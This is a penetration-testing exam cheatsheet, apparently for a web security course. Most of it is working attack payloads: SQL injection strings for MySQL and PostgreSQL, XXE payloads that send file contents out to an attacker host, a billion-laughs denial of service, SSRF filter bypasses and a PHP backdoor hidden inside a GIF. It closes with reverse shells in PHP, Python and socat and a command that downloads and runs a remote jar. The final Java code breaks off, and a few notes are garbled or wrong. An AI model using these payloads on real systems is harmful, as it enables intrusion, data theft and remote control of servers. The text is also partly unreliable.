
EXAM cheatsheet:

-------------------
BASIC STEPS
-------------------

/robots.txt
/sitemap.xml 
/non_existing_page
/admin, /root/, /anything  

opened ports 

if admin found just try to guess the password from default list

enumerate all pages we could access without authentication

------------
XSS
-------------
document.getElementById
document.getElementsByName
document.getElementByClassName
document.getElementByTagName

document.write
.innerHTML
eval()

DOM:

location.* (seach,protocol,pathname, origin etc.)

EXAMPLE: <iframe src="https://YOUR-LAB-ID.web-security-academy.net/#" onload="this.src+='<img src=x onerror=print()>'"></iframe>

------
TOOLS:
------
gobuster dir -u URL -w wordlist -x extension -f 

-u URL|IP 
-w wordlist 
-t threads (10 default) 
-a UA otherwise revelts itself as 'gobuster' 
-e print full url 
-x extension 
-f add slash to every request "/"
-x extension (can be separated with ',') 
-r (follow redirect) 
-k (skip certificate validation) 
-o output filename 
-s status code wanted (default:200,204,301,302,307,401,403)
-b blacklist pages with code 500,501,503 ?? 
--delay-duration (1500ms default) 

-----------
FFUF
-----------

Finding directories:

ffuf -c -r -t 200 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://shocker.htb/FUZZ/ 

-c : add color to output
-r : follow redirects
-t : timeout in seconds
-w : path to wordlist
-u : URL of website
-e .php,.asp,.html,.htmlx : extension

Finding cgi-bin directories:

ffuf -c -r -t 200 -e .txt,.php,.sh,.pl -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://shocker.htb/cgi-bin/FUZZ/

---------
SQLi 
---------

https://pentestmonkey.net/cheat-sheet/sql-injection/mysql-sql-injection-cheat-sheet
https://portswigger.net/web-security/sql-injection/cheat-sheet
https://perspectiverisk.com/mysql-sql-injection-practical-cheat-sheet/

https://www.mysqltutorial.org/mysql-cheat-sheet.aspx

https://github.com/kleiton0x00/Advanced-SQL-Injection-Cheatsheet

============
SQLI MYSQL
============
MYSQL: 

bikes' and 1=0/@@version;-- 
bikes' and 1=0/user;-- 

@@version
@@innodb_version (THIS GIVES ONLY 5.5.62 NOT WHOLE STRING LIKE @@VERSION)
@@version_comment (Debian)
@@version_compile_os
@@vesion_compile_machine

@@hostname
@@secure_file_priv -> where we can load files 
@@system_time_zone 

database()
version()
user()

STORAGE ENGINE:
------------------

@@default_storage_engine
@@storage_engine

DEFAULT VALUES:
---------------
@@port -> gives 0
@@max_allowed_packet  --> 16777216
@@wait_timeout -> 28800 

FILES:
-------
@@secure_file_priv -> default /var/lib/mysql-files 

https://dev.mysql.com/doc/refman/5.7/en/server-system-variables.html#sysvar_secure_file_priv

SSL:
------
have_ssl -> DISABLED
ssl_key -> get SSL key!
ssl_ca
ssl_cert

LOCATIONS:
------------

@@basedir (/usr - by default) 
@@tmpdir
@@datadir 
@@plugin_dir 

CLUSTER OPTIONS:
------------------

@@report_host
@@report_user
@@report_password

LOG:
@@general_log_file (/var/log/mysql/HOSTNAME.log)
@@log_error /var/log/mysql/error.log 

SPECIAL:
ft_boolean_syntax                                 | + -><()~*:""&| ///??? 

Get DBA NAME:
----------------
database()

YOU CAN REMOVE THE TEST DATABASE (WHICH BY DEFAULT CAN BE ACCESSED BY ALL USERS, EVEN ANONYMOUS USERS), 
AND PRIVILEGES THAT PERMIT ANYONE TO ACCESS DATABASES WITH NAMES THAT START WITH TEST_.

GET USER:
-----------
user()

GET ALL DATABASES:
--------------------------------
SELECT SCHEMA_NAME FROM INFORMATION_SCHEMA.SCHEMATA;

Retrieve database version:
----------------------------
UNION ALL SELECT NULL,concat(schema_name) FROM information_schema.schemata--

Retrieve table names:
----------------------
1 UNION ALL SELECT NULL,concat(TABLE_NAME) FROM information_schema.TABLES WHERE table_schema='database1'--

Retrieve column names:
-----------------------
1 UNION ALL SELECT NULL,concat(column_name) FROM information_schema.COLUMNS WHERE TABLE_NAME='table1'--

Retrieve data:
-----------------
1 UNION ALL SELECT NULL,concat(0x28,column1,0x3a,column2,0x29) FROM table1--

SELECT TABLE_SCHEMA,TABLE_NAME FROM INFORMATION_SCHEMA.TABLES; -> GET DATABASE, TABLE NAMES

SELECT HOST,USER,PASSWORD,AUTHENTICATION_STRING FROM MYSQL.USER 

select table_name from information_schema.tables where table_schema = database(); // or 'table_schemata = 'dba_name';

Note that in MySQL 5.7 and above the column ‘password’ doesn’t exists. They have changed it to ‘authentication_string’.

MYSQL FUNCTIONS:
-----------------

Mysql functions: https://medium.com/analytics-vidhya/mysql-functions-cheatsheet-with-examples-3a08bb36d074

version(), user(), database(), now(), power(2,10) - gives 1024 -> basic functions 

concat('str1','str2') -> str1str2

concat_ws('delimiter','str1','str2') -> str1:str2

MYSQL FUNCTIONS: 

https://dev.mysql.com/doc/refman/8.0/en/functions.html (be carefull this applies for MYSQL 8.0) !! 

https://www.w3schools.com/sql/func_mysql_if.asp

SUBQUERIES:
------------

select if (1=1,true,false); -> gives 1 back 

select if (1=1,sleep(3),sleep(0));

SELECT IF(COUNT(*) > 0, 'yes', 'no') FROM mytable;

SELECT IF(COUNT(*) > 0, 'yes', 'no') FROM mytable;

SELECT IF ((SELECT COUNT(*) FROM mytable), 'yes', 'no');

substr() -> is alias for substring();

SELECT SUBSTR('something',1,2); -> gives back 'AW' INDEX STARTS AT 1 NOT ZERO !!

MYSQL FILES:
---------------

The main problem here is:

secure_file_priv PRIVILEGE or startup --secure-file-priv is LIKE SANDBOX 

ChANGE THIS TO:
secure_file_priv = "" --> in MY.CNF - THIS DISABLES SANDBOXING 

This mysql options by default is ON -> is 1

select @@GLOBAL.secure_file_priv;

- mysql able to CREATE files but not to delete

STATEMENTS:

SELECT INTO OUTFILE 

SELECT INTO DUMPFILE ----> By default, uploaded file on the web server through INTO DUMPFILE !!!IS NOT EXECUTABLE!!!! BUT READABLE!

SELECT LOAD_FILE('ABSOLUTE PATH !!') 

LOAD DATA ('LOCAL' - only if file is on my machine not server) INFILE 'File.csv' INTO TABLE tableName FIELDS TERMINATED BY ',' 
LINES TERMINATED BY '\n'

The file can be read from the server host or the client host, depending on whether the 'LOCAL' modifier is given. 
LOCAL also affects data interpretation and error handling.

EXAMPLE: SELECT LOAD_FILE('/var/lib/mysql-files/load.txt') INTO outfile '/var/lib/mysql-files/loaded.txt' -> this works

Error in case of secure_file_priv: ERROR-1290 mysql is running with --secure-file-priv option

The behavior in MySQL server is identical to Microsoft SQL Server; because the value
is not enclosed between quotes MySQL treats it as a column name.

SELECT INJECTION:

SELECT * FROM users WHERE login='$nick' AND password='$passwd'

SELECT * FROM users WHERE login='$nick'' AND password='$passwd' ---> you have an error in your sql syntax

SELECT * FROM users WHERE login='$nick' or 1=1/*'' AND password='$passwd'

select name from tbl into outfile 'FILENAME' -> secure-file-priv - PREVENTS this - LOAD DATA FROM FILE, INTO OUTFILE -> can not do that! 

selet id from users where id = 1 OR ID IS NOT NULL -> gives ALL RECORDS FROM TABLE

LOAD DATA INFILE 'file.txt' INTO TABLE tablename;

FILE UPLOAD:
--------------

- 2 options - regular file upload 

or use INSERT TO GET CODE INTO TABLE AND FROM TABLE INTO FILE

> SELECT HEX(LOAD_FILE('D:/UPLOADER.PHP')) INTO OUTFILE 'D:/OUTPUT.HEX'\G WITH UNSUSPICIOUS UPLOADER

INSERT INJECTION:
-------------------

INSERT INTO TABLE_NAME SELECT * FROM ANOTHER_TABLE;

DELETE INJECTION:
-------------------

BLIND INJECTION:
-------------------

DOS:
-------

BENCHMARK(99999999,MD5(99999999))
 
MYSQL RUN SYSTEM COMMANDS:
----------------------------

system COMMAND 
system /bin/bash

---------------
MYSQLI TOOLS:
---------------

https://github.com/dtrip/mysqloit

--------------
MYSQL UDFS:
--------------

https://www.exploit-db.com/docs/44139

DOCU: 
https://www.blackhat.com/presentations/bh-usa-09/DZULFAKAR/BHUSA09-Dzulfakar-MySQLExploit-SLIDES.pdf

----------------------
POSTGRESQL INJECTION:
----------------------

HOW TO DO STACKED QUERY SQL INJECTION: 
-------------------------------------------
GET /servlet/asdf?ForMasRange=1&userId=1;<some query>;--+

AM I DATABASE ADMIN QUERY: SELECT current_setting('is_superuser');

GET
/servlet/asdf?ForMasRange=1&userId=1;SELECT+case+when+(SELECT+current_setting($$is_superuser$$))=$$on$$+then+pg_sleep(10)+end;--+

;SELECT+case+when+(SELECT+current_setting($$is_superuser$$))=$$on$$+then+pg_sleep(10)+end;--+

;SELECT+case+when+(SELECT+current_setting(is_superuser))=on+then+pg_sleep(10)+end;--+

SELECT CASE WHEN (SOMETHING)=1 THEN else statement END;--+ 

ACCESSING FILESYSTEM in postgresql
===================================
COPY <table_name> from <file_name>
Listing 152 - Reading content from files
COPY <table_name> to <file_name>
Listing 153 - Writing content to files

CREATE temp table awa (content text); # 1. Create temporary table
COPY awa from $$c:\awa.txt$$;		   # 2. copy data from file to table
SELECT content from awa;			   # 3. select * from table
DROP table awa                        # 4. drop the table

Query:

GET
/servlet/asdf?ForMasRange=1&userId=1;create+temp+table+awa+(content+text);
copy+awa+from+$$c:\awa.txt$$;
select+case+when(ascii(substr((select+content+from+awa),1,1))=104)+then+pg_sleep(10)+end;--+ HTTP/1.0

--------------------
XML INJECTION xxe:
--------------------

Content-Type: application/xml

exists EXTERNAL and INTERNAL entities ..

ENTITIES:

INTERNAL ENTITY: <!ENTITY name "value"> 

USAGE:

<?xml version="1.0" ?>
<!DOCTYPE data [
<!ELEMENT data ANY >
<!ENTITY lastname "Replaced">
]>
<Contact>
<lastName>&lastname;</lastName>
<firstName>Tom</firstName>
</Contact>

EXTERNAL ENTITY: <!ENTITY name SYSTEM "value">

<!ENTITY % name SYSTEM "URI">

PUBLIC ENTITY: <!ENTITY name PUBLIC "value"> 

Example of PUBLIC ENTITY: 

<!ENTITY offsecinfo PUBLIC "-//W3C//TEXT companyinfo//EN"
"http://www.offsec.com/companyinfo.xml">

Parameter entities exist solely within a DTD, but are otherwise very similar to any other entity:

<!ENTITY % course 'AWA'>
<!ENTITY Title 'Security presents %course;' >

UNPARSED EXTERNAL ENTITIES:

<!ENTITY name SYSTEM "URI" NDATA TYPE>
<!ENTITY name PUBLIC "public_id" "URI" NDATA TYPE>

DEFINE NEW ELEMENT: 

<!ELEMENT data ANY>

We can access binary content with unparsed entities.

Scenario:

1. Define new DOCTYPE and ENTITY:

<!DOCTYPE results [ <!ENTITY harmless "random text"> ]>

use the ENTITY in tag:

<something>&harmless;<something>

2. define EXTERNAL entity with "SYSTEM" -> reference it via "&entity;" in tag  

3. try to read files or URL -> if can read files, read more 

4. read vulnerable files on system - find passwords, keys, txt etc. 

Rules for XML syntax:
----------------------
- tags are case sensitive, so <item> is not the same as <ITEM>
- tags must be good structured <root><item><data></item></root> This is bad structured
- tags must have enclosing tags 
- XML Attribute Values MUST ALWAYS BE QUOTED <note date="12/11/2017"> - valid 

'!If you place a character like "<" inside an XML element, it will generate an error because the parser interprets it as the start of a new element.'

JUST BREAK THE SYNTAX with: < > <!-- not ended properly .. etc 

This is comment: <!-- This is an invalid -- comment -->

Example of such error:

"XML parser exited with error: org.xml.sax.SAXParseException; lineNumber: 1; columnNumber: 93; 
The declaration for the entity "xxe" must end with '>'."

There are 5 pre-defined entity references in XML:

&lt;	<	less than
&gt;	>	greater than
&amp;	&	ampersand 
&apos;	'	apostrophe
&quot;	"	quotation mark

So we can mess with all of this references.

<!DOCTYPE foo[<!ENTITY xxe SYSTEM "file:///etc/passwd"]>

XML validator: https://www.w3schools.com/xml/xml_validator.asp

Validate XML with python:

import xml.etree.ElementTree as ET

try:
 ET.parse(FILENAME)
except:
 print("Inalid!")

THE EXTERNAL ENTITY ATTACK:
------------------------------

<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE docname [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<entity>&xxe;</entity>

USING PHP FILTER:
-----------

<!DOCTYPE r [
<!ELEMENT r ANY >
<!ENTITY sp SYSTEM "php://filter/resource=/etc/passwd">
]>

ENTITY IS BASICALLY AN VARIABLE WITH ITS VALUE: there can be anything within value such: <script>alert</script> or 1 OR 1--

XXE vulnerabilities arise because the XML specification contains various potentially dangerous features

<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://internal.vulnerable-website.com/"> ]>

Define DTD and Entity: 

<!DOCTYPE foo [ <!ENTITY myentity "my entity value" > ]>

<!DOCTYPE myfoodtd[<!ASDF myentity "value" >]>

XML external entities are a type of custom entity whose definition is located outside of the DTD where they are declared.

The declaration of an external entity uses the SYSTEM keyword and must specify a URL from which the value of the entity should be loaded. For example:

<!DOCTYPE foo [ <!ENTITY ext SYSTEM "http://normal-website.com" > ]>
The URL can use the file:// protocol, and so external entities can be loaded from file. For example:

<!DOCTYPE foo [ <!ENTITY ext SYSTEM "file:///path/to/file" > ]>

<!DOCTYPE foo[<!ENTITY ext SYSTEM "URL" ]>

Using EVAL, eval:

<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://web-attacker.com/?x=%file;'>">
%eval;
%exfiltrate;


XML COMMENT: <!-- --> -> same as with HTML !

web.xml contains -> Servlet -> WEB URL 

PHP offers three frequently used methods of parsing and consuming XML: PHP DOM, SimpleXML and XMLReader. All three of these use the libxml2 extension

Bypassing IP restrictions:
 SINCE ALL HTTP REQUESTS BY THE XML PARSER WILL BE MADE FROM LOCALHOST.
 
----------------------------
XXE FILE ATTACK scenario:
----------------------------

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>

<stockCheck><productId>&xxe;</productId></stockCheck>

!!
To test systematically for XXE vulnerabilities, you will generally need to test each data node in the XML individually, 
by making use of your defined entity and seeing whether it appears within the response.
!! 

XXE DOS ATTACKS:
-----------------

<!DOCTYPE lolz [
 <!ENTITY lol "lol">
 <!ENTITY lola "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
 <!ENTITY lolb "&lola;&lola;&lola;&lola;&lola;&lola;&lola;&lola;&lola;&lola;">
 <!ENTITY lolc "&lolb;&lolb;&lolb;&lolb;&lolb;&lolb;&lolb;&lolb;&lolb;&lolb;">
 <!ENTITY lold "&lolc;&lolc;&lolc;&lolc;&lolc;&lolc;&lolc;&lolc;&lolc;&lolc;">
 <!ENTITY lole "&lold;&lold;&lold;&lold;&lold;&lold;&lold;&lold;&lold;&lold;">
 <!ENTITY lolf "&lole;&lole;&lole;&lole;&lole;&lole;&lole;&lole;&lole;&lole;">
 <!ENTITY lolg "&lolf;&lolf;&lolf;&lolf;&lolf;&lolf;&lolf;&lolf;&lolf;&lolf;">
 <!ENTITY lolh "&lolg;&lolg;&lolg;&lolg;&lolg;&lolg;&lolg;&lolg;&lolg;&lolg;">
 <!ENTITY loli "&lolh;&lolh;&lolh;&lolh;&lolh;&lolh;&lolh;&lolh;&lolh;&lolh;">
]>
<attack>&loli;</attack>

-------------------
LIST DIRECTORY:
------------------

<?xml version="1.0"?>
<!DOCTYPE comment[<!ENTITY xxe SYSTEM "file:///etc/" >]>
<comment><text>file:///etc/ &xxe;</text></comment>

----------
CDATA
----------
XML also supports CDATA161 sections in which internal contents are not treated as markup just like regular text. 

<![CDATA[
   characters with markup
]]>

CDATA cannot contain the string "]]>" anywhere in the XML document.
Nesting is not allowed in CDATA section.

Usage example:

<?xml version="1.0"?>
<!DOCTYPE data [
<!ENTITY % start "<![CDATA[">
<!ENTITY % file SYSTEM "file:///home/student/crx/apache-tomee-plus-7.0.5/conf/tomcatusers.
xml" >
<!ENTITY % end "]]>">
<!ENTITY % dtd SYSTEM "http://192.168.119.120/wrapper.dtd" >
%dtd;
]>
<org.opencrx.kernel.account1.Contact>
<lastName>&wrapper;</lastName>
<firstName>Tom</firstName>
</org.opencrx.kernel.account1.Contact>

XInclude ATTACK:
--------------------

XInclude is a part of the XML specification that allows an XML document TO BE BUILT FROM SUB-DOCUMENTS. 

inside element:

<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo>

SOLUTION:

<!ENTITY % file SYSTEM "file:///etc/hostname">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://BURP-COLLABORATOR-SUBDOMAIN/?x=%file;'>">
%eval;
%exfil;

=====================
LOCAL FILE INCLUDE:
=====================

.inc files
include() -> on fail -> Warning -> BY default allows to include other path such URL, STREAM but allow_url_include -> is set NO by default so PHP refuses to use it 
require() -> on fail -> ERROR 
include_once()
require_once()


file.php?fname=test.php?cmd=whoami --> howto 

allow_url_fopen -> by default -> On
allow_url_include -> by default -> Off

include_path=.:/usr/share/php:/usr/share/pear -> DOES NOT EXISTS

/usr/share/php - OK

There is also /usr/share/php5 -> but this DIR IS NOT INCLUDED

/usr/share/php/ -> DIR php-gettext:

get-text.php
get-text.php
streams.php

Vulnerabilities- https://vulmon.com/searchpage?q=php-gettext

Arbitrary code execution in select_string, ngettext and npgettext count parameter

Public readable files:

/proc/version
/etc/hostname
/proc/modules
/proc/meminfo
/proc/cpuinfo
/proc/partitions
/etc/network/interfaces 
/etc/rc.local -> last line is 'exit 0'
/etc/chromium.d/apikeys 

/var/run/apache2/apache2.pid

FROM LFI -> RCE -> 

----------
LFI:
----------

https://sushant747.gitbooks.io/total-oscp-guide/content/local_file_inclusion.html

- access.log 

- error.log 

- REFERER

- ORIGIN ?? 

Normally apache2 access_log is NOT readable by PHP, BUT permissions are following
-rw-r-- root:adm , by default is www-data NOT in adm group 

using:
usermod -aG adm www-data -> NOW can php access apache access log

Prevent to access included files via:

<Files ~ "\.inc$">
 Order deny,allow
 Deny from all 
</Files>

POZOR na .INC files -> by default apache nezobrazi ich obsah, je treba urobi view-source:

<FilesMatch "\.inc$">
SetHandler application/x-httpd-php
</FilesMatch>


Modern Apache -> 

<FilesMatch "\.inc$">
 Require all denied 
</FilesMatch>

basename() - function to prevent file can not hold any path information

USE REALPATH() - as protection or reg_exp

Null byte injection has been fixed in PHP 5.3.4 (which it's self is already an old and unsupported PHP version): https://bugs.php.net/bug.php?id=39863.

Null byte injection on PHP?

In the URL it is represented by %00.

Download remote file:

fopen()
file_get_contents()
 
stream_get_wrappers(): array -> return registered streams of php

=======================
NULL BYTE INJECTION:
=======================

https://resources.infosecinstitute.com/topic/null-byte-injection-php/

%00 
For example: In Unicode, it is represented by u0000 or z. Some languages have represented it by �00 or x00.

- find any .gif file
- with tool :

gifsicle –comment “`tr ‘n’ ‘ ‘ < simple-backdoor.php`” < hehe.gif >action_back_out.php

add php code into comment section

- catch uploaded file in BURP and change in hex mode its name from name.git to name.phpA.gif 

find 0x41 in hex and replace with 00 which cuts out rest of the file name

PHP DANGEROUS FUNCTIONS:
---------
PHP:
system()
exec()
backticks 
shell_exec()
passthru()
exec();
eval();

RCE functions, Local file include, Null byte injections, Linux privilege escalation exploits


PHP TYPE JUGGLING:
-------------------

Remember type juggling is also about <= >= and == != 

"0" == 0 -> True

"0ExponentAnynumber" == 0 because 0 exponent anything is always 0; 0e1000 == 0 -> True 

"anythingEzero" == 1 - anything on exponent 0 is always 1 -> 1000e0 -> 1 == 1 -> True

0xF == 15 -> True

"-1 == True 

0xAAAA == 43690

PHP Magic hashes:
---------------------

this allows auth bypass or JUMP on code line 

php > echo md5('240610708');
0e462097431906509019562988736854

other md5 magic hashes:

https://github.com/spaze/hashes/blob/master/md5.md

240610708:0e462097431906509019562988736854
QLTHNDT:0e405967825401955372549139051580
QNKCDZO:0e830400451993494058024219903391
PJNPDWY:0e291529052894702774557631701704
NWWKITQ:0e763082070976038347657360817689
NOOPCJF:0e818888003657176127862245791911
MMHUWUV:0e701732711630150438129209816536
MAUXXQC:0e478478466848439040434801845361
IHKFRNS:0e256160682445802696926137988570
GZECLQZ:0e537612333747236407713628225676
GGHMVOE:0e362766013028313274586933780773
GEGHBXL:0e248776895502908863709684713578

SHA1:
aaroZmOk:0e66507019969427134894567494305185566735
aaK1STfY:0e76658526655756207688271159624026011393
aaO8zKZF:0e89257456677279068558073954252716165668
aa3OFF9m:0e36977786278517984959260394024281014729
w9KASOk6Ikap:0e94685489941557404937568181716894429726

Sha-256: 
Sol7trnk00:0e57289584033733351592613162328254589214408593566331187698889096
NzQEVVCN10:0e92299296652799688472441889499080435414654298793501210067779366
Z664cnsb60:0e51257675595021973950657753067030245565435125968551772003589958
jF7qQUmx70:0e04396813052343573929892122002074460952498169617805703816566529
0e9682187459792981:0e84837923611824342735254600415455016861658967528729588256413411
0e9377421626279222:0e48575090397052833642912654053751294419348146401806328515618635

-> create magic email address by generating md5 hash send this by email ;


Should always be looking out for the use of loose comparisons when reviewing PHP applications 

So look during test for loose comparison

How to create magic hash:

a) md5 or sha1 number which gives hash value as 'numberEnumber' -> 0e12345 -> 0 exponent something always gives -> 0

OR 1e12345 -> always gives 1 as results

b) loose comparison 

"0e1234" == "0" -> TRUE

"0e5678" == 0 --> TRUE

THIS IS ONLY HAS TO KNOWN to be able produce 'numberEnumber' string ->

echo md5('240610708')

== LOOSE COMPARISON 

=== STRICT COMPARISON 

public php scripts have in code: $_user_location = 'public';


========================
.NET 
========================

dnspy - decompiler, debugger  for .NET applications - runs only on Windows 

csc.exe - .NET compiler cmd type 

Decompiling .NET:

https://portal.offensive-security.com/courses/web-300/books-and-videos/modal/modules/tools-&-methodologies/source-code-recovery/managed-.net-code

https://www.jetbrains.com/rider/promo/ -> try this .NET decompiler - free for 30 days

https://pentest-tools.com/blog/exploit-dotnetnuke-cookie-deserialization

==========================
SSRF
===========================

In a Server-Side Request Forgery (SSRF) attack, the attacker can abuse functionality on the server to read or update internal resources.

Internal REST interfaces
Files - The attacker may be able to read files using <file://> URIs

Exploitation through microservices -> microservice less than traditional webapp -> SOAP or REST

Docker + Compose -> 1 micro service is in CONTAINER[ micro service] -> docker automatically set DNS by container name 


[container 1] - subhost1 - CAN COMMUNICATE BETWEEN THEM, micro has its own API  - API GATEWAY - routes based on REGEX to micro service 

[container 2] - subhost2 												   API

[container 3] - subhost3 												   API 

So API gateway see something like /user -> USER MICROSERVICE 
								  /something_else -> not in use microservice 
								  

SERVICE MIGHT HAVE ONE URL BUT PERFORM DIFFERENT ACTIONS BASED ON AN HTTP REQUEST’S METHOD.

API discovery: SOAP | REST 

(All SOAP requests are usually sent with an HTTP POST request.)

Methods:

GET - select data
POST - create or update data
PUT, PATCH - create data or update them 
DELETE - 

LOOK FOR ADMIN API PANEL:

version
verbs 
actions
parameters 
routing 

ANY TIME WE DISCOVER AN API OR WEB FORM THAT INCLUDES A URL PARAMETER, WE ALWAYS WANT TO CHECK IT FOR A SERVER-SIDE REQUEST FORGERY VULNERABILITY. 

---------------------------------------------------------------------------------------------------------------
SSRF EXPLOITATION: 
---------------------------------------------------------------------------------------------------------------

1. Try to make call to 127.0.0.1 -> if admin sits on his ass and this machine this is explicitly allowed and ok 

We can trick this with different IP representation:

127.0.0.1, such as 2130706433, 017700000001, or 127.1.

Registering your own domain name that resolves to 127.0.0.1.

2. ADMIN interface might be on different port number 

3. Try to scan other ip addreses or ports or URL (ipcalc)

MORE TRICKS:

- You can embed credentials in a URL before the hostname, using the @ character. For example: https://expected-host@evil-host

- You can use the # character to indicate a URL fragment. For example: https://evil-host#expected-host

- You can leverage the DNS naming hierarchy to place required input into a fully-qualified DNS name that you control. For example:

https://expected-host.evil-host

- You can URL-encode characters to confuse the URL-parsing code. 

- Using redirection like this: /product/nextProduct?currentProductId=6&path=http://evil-user.net

- REFERER header 

Server-Side Request Forgery (SSRF) occurs when an attacker can force an application or server to REQUEST DATA OR A RESOURCE.

So gives back data - not supposed to be getting or accessing some resource which is not suppose to access. 

microservices will often have fewer security controls in place if they rely upon an API GATEWAY OR REVERSE PROXY.

A POST request usually creates a new object or new data. 
A PUT or PATCH request updates the data of an existing object. Applications might handle these two verbs differently, but a 
PUT request usually updates an entire object while a PATCH request updates a subset of an object.
Finally, a DELETE request deletes an object.

gobuster dir -u http://apigateway:8000 -w endpoints_sorted.txt --proxy http://127.0.0.1:8080

-s 200,204,301,302,307,401,403,405,500 (wanted status codes)

!!! Endpoints dictionary must ROCK 

And finally: How exam works..

CURL basic: 
CURL digest: curl -v  'https://jigsaw.w3.org/HTTP/Digest/' --digest -u guest:guest --form data=blahblah

A lot of the posts here have good tips on how to enumerate and what to do on the exam. The main note I wanted to drop is that there is a significant factor of luck in this exam. If you fail or do badly, don't take it too harshly. After what happened to me, I'm fairly confident that luck is a huge factor because the differences between my first box set and the second set were night and day.

kali@kali:~$ curl -i -X POST -H "Content-Type: application/json" -d '{"url":"http://192.168.118.3/ssrftest"}' http://apigateway:8000/files/import
HTTP/1.1 500 Internal Server Error

Axios,1 an HTTP client for Node.js.

((John Jakob Sarjeant, 2020), https://axios-http.com/)

[SSRF SOURCES:]
https://portswigger.net/web-security/ssrf

[EXCERCISES:]

https://portswigger.net/web-security/ssrf/lab-basic-ssrf-against-localhost


XHR / XMLhttprequest
----------------------

POST:

var xhr = new XMLHttpRequest();
xhr.open('POST', 'somewhere', true);
xhr.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
xhr.onload = function () {
    // do something to response
    console.log(this.responseText);
};
xhr.send('user=person&pwd=password&organization=place&requiredkey=key');

OR we can use POST data:

var data = new FormData();
data.append('user', 'person');
data.append('pwd', 'password');
data.append('organization', 'place');
data.append('requiredkey', 'key');

var xhr = new XMLHttpRequest();
xhr.open('POST', 'somewhere', true);
xhr.onload = function () {
    // do something to response
    console.log(this.responseText);
};
xhr.send(data);


FETCH: 
-----------
fetch('http://w3c.wz.cz/users.json').then(response => response.json()).then(json => console.log(json))

CSRF fetch:

const csrfToken = getCookie('CSRF-TOKEN');

const headers = new Headers({
        'Content-Type': 'x-www-form-urlencoded',
        'X-CSRF-TOKEN': csrfToken
    });
    return this.fetcher(url, {
        method: 'POST',
        headers,
        credentials: 'include',
        body: JSON.stringify({
            email: 'test@example.com',
            password: 'password'
        })
    });
	
  

API - unresticted access to to API without keys - leverages default user accounts that can be accessed with undocumented API keys.

The application is running on port 8001.

http://concord:8001/docs/index.html

1. CORS -> 

/api/service/console/whoami API request (which returned an unauthorized response) is interesting. 

ACCESS-CONTROL-ALLOW-ORIGIN: * 

-> SPOOF origin HEADER

-> CSRF with spoofed origin to Authenticated user 

the purpose of SOP is not to prevent the request for a resource from being sent, but to prevent JavaScript from reading the response.

Chromium CTRL+SHIFT+RETURN - TRY IN CONSOLE:

fetch("http://concord:8001/cfg.js")
	.then(function (response) {
		return response.text();
	})
	.then(function (text) {
		console.log(text);
	})

Access-Control-Allow-Origin: Describes which origins can access the response. -> This header can be set to three values: "", an origin, or "null".
Access-Control-Allow-Credentials: Indicates if the request can include credentials (cookies)
Access-Control-Expose-Headers: Instructs the browser to expose certain headers to JavaScript

Some requests require an HTTP preflight request2 (sent with the OPTIONS method), which determines if the subsequent browser request should be allowed to be sent.

!!!
From a security perspective, the most important headers when analyzing target applications for CORS vulnerabilities are Access-Control-Allow-Origin and Access-Control-Allow-Credentials. Access-Control-Allow-Credentials only accepts a "true" value with the default being "false". If this header is set to true, any request sent will include the cookies set by the site. This means that the browser will automatically authenticate the request.

!!!
In secure circumstances, the Access-Control-Allow-Origin would only be set to trusted origins. This means that a malicious site we control would not be able to make HTTP requests on behalf of a user and read the response.

Spoof origin header -> if set in reponse - IT IS A WIN!

SAME SITE FLAG-> 

When SameSite is set to None, cookies will be sent in all contexts:

Finally, the Lax value instructs that the cookies will be sent on some requests across different sites. For a cookie to be included in a request, it must meet both of the following requirements:

It must use a method that does not facilitate a change on the server (GET, HEAD, OPTIONS).2
It must originate from user-initiated navigation (also known as top-level navigation), for example, clicking a link will include the cookie, but requests made by images or scripts will not.

SameSite is set to None the browser will send the cookie in all contexts

Often times, CSRF tokens are incorrectly configured, reused, or not rotated frequently enough. In addition, if the site is vulnerable to permissive CORS headers, we would be able to extract a CSRF token by requesting it from the page that would embed it.

Since Concord has some permissive CORS headers, any site that an authenticated user visits can interact with Concord and ride the user's session. 

As we discovered earlier, only GET requests and some POST requests will work in Concord.

he request is sent with a POST request using the application/json content type. Unfortunately, this won't work as the browser will send an OPTIONS request before the POST request. As we've learned earlier, the responses to OPTIONS requests in Concord contain different CORS headers that are less vulnerable. Let's keep searching.

api/v1/process 

According to Mozilla, a "multipart/form-data" content type does not require a preflight check.3

CURL command sends a GET request to /api/v1/process and specifies the ZIP with the -F

curl -X GET -F FILENAME -H 'Content-type: application/json' ( -F flag specifies multipart data.) multipart/form-data 


------------------
CURL UPLOAD FILE:
------------------

$ curl -F 'parameterNAME=@/path/to/fileX' -F 'fileY=@/path/to/fileY' ... http://localhost/upload

to send multiple files:

curl -F 'fileX=@/path/to/fileX' -F 'fileY=@/path/to/fileY' ... http://localhost/upload

---------------------------------
REVERSE SHELLS:
---------------------------------

PHP REVERSE SHELL:
--------------------

php -r '$sock=fsockopen("10.0.0.1",4242);$proc=proc_open("/bin/sh -i", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);'

PYTHON:
-------

s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("192.168.1.2",4444))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
p=subprocess.call(["/bin/sh","-i"])

SOCAT:
--------

HACKER: socat file:`tty`,raw,echo=0 tcp-listen:4444  

VICTIM: socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:HACKER_IP:4444

JAVA:
------
wget http://1.1.1.1:9999/revs.jar -O /tmp/revs1.jar;

java -jar /tmp/revs1.jar;

import java.io.IOException;    
public class ReverseShell {    
    public static void main(String[] args) throws IOException, InterruptedException {
        // TODO Auto-generated method stub
        Runtime r = Runtime.getRuntime();
